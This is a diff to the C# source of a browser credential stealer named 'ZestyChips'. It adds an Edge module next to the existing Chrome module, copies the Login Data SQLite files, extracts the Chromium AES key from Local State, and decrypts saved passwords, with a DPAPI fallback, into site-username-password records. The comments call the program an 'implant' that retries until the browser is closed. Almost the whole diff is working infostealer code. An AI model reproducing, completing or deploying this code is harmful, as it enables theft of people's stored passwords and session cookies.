@@ -30,6 +30,7 @@ namespace ZestyChips
         private static void Chrome() {
             string cookies = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc");
             string login = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Login Data", "p");
+            string edge = StealEdgeData();
         }
         
         /*
@@ -37,14 +38,71 @@ namespace ZestyChips
         */
         private static string StealEdgeData() {
             string result = string.Empty;
+            string loginDataLoc = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
+
+            // two structures for saving our results into
+            Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
+            List<string> passwordResultsList = new List<string>();
+
+            // Helpers.PrintInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + loginDataLoc);
 
             // check if we have edge data in the first place
-            bool hasEdgeData = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data");
+            bool hasEdgeData = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + loginDataLoc);
             if (hasEdgeData) {
                 return "Edge not found";
             }
 
-            
+            string sourceFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + loginDataLoc;
+            string filename = "ep";
+
+            for (;;) {
+                try {
+                    File.Copy(sourceFile, filename, true);
+                    break;
+                } catch (Exception ex) {
+                    // exception will throw most likely if edge is open
+                    // implant will continually run until edge is closed / process terminated
+                    Helpers.PrintFail($"failed to copy edge data, {ex.Message}");
+                    Thread.Sleep(10000); // slp 10 sec
+                }
+            }
+
+            SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={filename}");
+            try {
+                // connect to the db file and select data
+                sqliteConnection.Open();
+                SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
+                sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
+                SQLiteDataReader sdr = sqliteCommand.ExecuteReader();
+
+                // decypt password_value
+                byte[] key = GetChromiumEncryptionKey("/../Local/Microsoft/Edge/User Data/Local State");
+                while (sdr.Read()) {
+                    object usernameValue = sdr["username_value"];
+                    object actionURL = sdr["action_url"];
+                    string decryptedOldStylePasswords = "";
+                    byte[] bytes = GetBytesFromReader(sdr, 2);
+                    byte[] iv;
+                    byte[] encryptedBytes;
+                    Aes256Prepare(bytes, out iv, out encryptedBytes);
+                    string decryptedPassword = Aes256Decrypt(encryptedBytes, key, iv);
+
+                    // try for older versions of edge
+                    try {
+#pragma warning disable CA1416
+                        decryptedOldStylePasswords = Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[])sdr["password_value"], null, DataProtectionScope.CurrentUser));
+#pragma warning restore CA1416
+                    } catch {
+                        // leave empty for now
+                    }
+
+                    ProcessAndFormatPasswords(decryptedPassword, actionURL, usernameValue, ref masterDictionary, decryptedOldStylePasswords, ref passwordResultsList);
+                }
+
+
+            } catch (Exception ex) {
+                Helpers.PrintFail($"Error processing Edge data: {ex}");
+            }
             
             return result;
         }
@@ -71,7 +129,7 @@ namespace ZestyChips
                     } catch (Exception ex) {
                         // exception will throw most likely if chrome is open
                         // implant will continually run until chrome is closed / process terminated
-                        Helpers.PrintInfo("an error occurred copying cache: " + ex.Message);
+                        Helpers.PrintInfo("an error occurred copying Chrome data: " + ex.Message);
                         Thread.Sleep(10000); // sleep 10 seconds
                     }
                 }
@@ -124,7 +182,7 @@ namespace ZestyChips
             SQLiteDataReader sdr = sqliteCommand.ExecuteReader();
 
             // get the encryption key Chrome is using
-            byte[] encryptionKey = GetChromeEncryptionKey();
+            byte[] encryptionKey = GetChromiumEncryptionKey("/../Local/Google/Chrome/User Data/Local State");
 
             // dictionary to store the result of each iteration of data so we can concat into 1 json object to return
             Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
@@ -132,8 +190,8 @@ namespace ZestyChips
             List<string> passwordResultsList = new List<string>();
 
             while (sdr.Read()) {
-                object obj = sdr["username_value"];
-                object obj2 = sdr["action_url"];
+                object usernameValue = sdr["username_value"];
+                object actionURL = sdr["action_url"];
                 string decryptedOldStylePasswords = "";
 
                 byte[] bytes = GetBytesFromReader(sdr, 2);
@@ -154,61 +212,63 @@ namespace ZestyChips
                     // that it  doesnt  exist :)
                 }
 
-                string passwordResult = "";
+            //     string passwordResult = "";
 
-                if (decryptedPassword != "") {
-                    string dict_site = obj2.ToString();
-                    string dict_user = obj.ToString();
+            //     if (decryptedPassword != "") {
+            //         string dict_site = actionURL.ToString();
+            //         string dict_user = usernameValue.ToString();
 
-                    if (dict_site == "") {
-                        dict_site = "Site URL not found"; // can't carve out some sites for some reason. E.g. reddit
-                    }
+            //         if (dict_site == "") {
+            //             dict_site = "Site URL not found"; // can't carve out some sites for some reason. E.g. reddit
+            //         }
 
-                    if (masterDictionary.ContainsKey(dict_site)) {
-                        Dictionary<string, string> dictionary2 = masterDictionary;
-                        dictionary2[dict_site] = string.Concat(new string[] {
-                            dictionary2[dict_site],
-                            (dict_user != null) ? dict_user.ToString() : null,
-                            "|||",
-                            decryptedPassword,
-                            "; "
-                        });
-                    } else {
-                        masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
-                    }
-                } else if (decryptedOldStylePasswords != "") {
-                    // this section is untested, so given try catch
-                    try {
-                        string dict_site = obj2.ToString();
-                        string dict_user = obj.ToString();
+            //         if (masterDictionary.ContainsKey(dict_site)) {
+            //             Dictionary<string, string> dictionary2 = masterDictionary;
+            //             dictionary2[dict_site] = string.Concat(new string[] {
+            //                 dictionary2[dict_site],
+            //                 (dict_user != null) ? dict_user.ToString() : null,
+            //                 "|||",
+            //                 decryptedPassword,
+            //                 "; "
+            //             });
+            //         } else {
+            //             masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
+            //         }
+            //     } else if (decryptedOldStylePasswords != "") {
+            //         // this section is untested, so given try catch
+            //         try {
+            //             string dict_site = actionURL.ToString();
+            //             string dict_user = usernameValue.ToString();
 
-                        if (masterDictionary.ContainsKey(dict_site)) {
-                            Dictionary<string, string> dictionary2 = masterDictionary;
-                            dictionary2[dict_site] = string.Concat(new string[] {
-                                dictionary2[dict_site],
-                                (dict_user != null) ? dict_user.ToString() : null,
-                                "|||",
-                                decryptedPassword,
-                                "; "
-                            });
-                        } else {
-                            masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
-                        }
-                    } catch {
-                        passwordResult = string.Concat(new string[]{
-                            passwordResult,
-                            (obj2 != null) ? obj2.ToString() : null,
-                            " ",
-                            (obj != null) ? obj.ToString() : null,
-                            " ",
-                            decryptedOldStylePasswords,
-                            " 2\r\n"
-                        });
-                        passwordResultsList.Add(passwordResult);
-                    }        
-                }
+            //             if (masterDictionary.ContainsKey(dict_site)) {
+            //                 Dictionary<string, string> dictionary2 = masterDictionary;
+            //                 dictionary2[dict_site] = string.Concat(new string[] {
+            //                     dictionary2[dict_site],
+            //                     (dict_user != null) ? dict_user.ToString() : null,
+            //                     "|||",
+            //                     decryptedPassword,
+            //                     "; "
+            //                 });
+            //             } else {
+            //                 masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
+            //             }
+            //         } catch {
+            //             passwordResult = string.Concat(new string[]{
+            //                 passwordResult,
+            //                 (actionURL != null) ? actionURL.ToString() : null,
+            //                 " ",
+            //                 (usernameValue != null) ? usernameValue.ToString() : null,
+            //                 " ",
+            //                 decryptedOldStylePasswords,
+            //                 " 2\r\n"
+            //             });
+            //             passwordResultsList.Add(passwordResult);
+            //         }        
+            //     }
+            // }
+
+                ProcessAndFormatPasswords(decryptedPassword, actionURL, usernameValue, ref masterDictionary, decryptedOldStylePasswords, ref passwordResultsList);
             }
-
             // cleanup
             // sqliteConnection.Close();
             // sdr.Close();
@@ -279,8 +339,8 @@ namespace ZestyChips
         }
 
         // get enckey from Chrome/User Data/Local State
-        private static byte[] GetChromeEncryptionKey() {
-            string localStateFileData = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "/../Local/Google/Chrome/User Data/Local State");
+        private static byte[] GetChromiumEncryptionKey(string path) {
+            string localStateFileData = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + path);
 
             // use native tools to pull out the encrypted encryption key used by Chrome
             using JsonDocument doc = JsonDocument.Parse(localStateFileData);
@@ -308,7 +368,7 @@ namespace ZestyChips
             // decode & decrypt the encryption key
             while (sdr.Read()) {
                 byte[] rawEncryptedChromeRow = (byte[])sdr["encrypted_value"];
-                byte[] encryptionKey = GetChromeEncryptionKey();
+                byte[] encryptionKey = GetChromiumEncryptionKey("/../Local/Google/Chrome/User Data/Local State");
 
                 // decrypt encrypted data from chrome
                 using (MemoryStream memoryStream = new MemoryStream(rawEncryptedChromeRow)) {
@@ -367,6 +427,65 @@ namespace ZestyChips
 
             // serialise to JSON and ret
             return JsonSerializer.Serialize(masterDictionary);
+        }
+
+        // process password data into a nice format
+        private static void ProcessAndFormatPasswords(string decryptedPassword, object actionURL, object usernameValue, 
+                                                        ref Dictionary<string, string> masterDictionary, string decryptedOldStylePasswords, 
+                                                        ref List<string> passwordResultsList) {
+            string passwordResult = "";
+                        
+            if (decryptedPassword != "") {
+                string dict_site = actionURL.ToString();
+                string dict_user = usernameValue.ToString();
+
+                if (dict_site == "") {
+                    dict_site = "Site URL not found"; // can't always carve out some sites
+                }
+
+                if (masterDictionary.ContainsKey(dict_site)) {
+                    Dictionary<string, string> dictionary2 = masterDictionary;
+                    dictionary2[dict_site] = string.Concat(new string[] {
+                        dictionary2[dict_site],
+                        (dict_user != null) ? dict_user.ToString() : null,
+                        "|||",
+                        decryptedPassword,
+                        "; "
+                    });
+                } else {
+                    masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
+                }
+            } else if (decryptedOldStylePasswords != "") {
+                // this section is untested, so given try catch
+                try {
+                    string dict_site = actionURL.ToString();
+                    string dict_user = usernameValue.ToString();
+
+                    if (masterDictionary.ContainsKey(dict_site)) {
+                        Dictionary<string, string> dictionary2 = masterDictionary;
+                        dictionary2[dict_site] = string.Concat(new string[] {
+                            dictionary2[dict_site],
+                            (dict_user != null) ? dict_user.ToString() : null,
+                            "|||",
+                            decryptedPassword,
+                            "; "
+                        });
+                    } else {
+                        masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
+                    }
+                } catch {
+                    passwordResult = string.Concat(new string[]{
+                        passwordResult,
+                        (actionURL != null) ? actionURL.ToString() : null,
+                        " ",
+                        (usernameValue != null) ? usernameValue.ToString() : null,
+                        " ",
+                        decryptedOldStylePasswords,
+                        " 2\r\n"
+                    });
+                    passwordResultsList.Add(passwordResult);
+                }        
+            }
         }
     }
 }
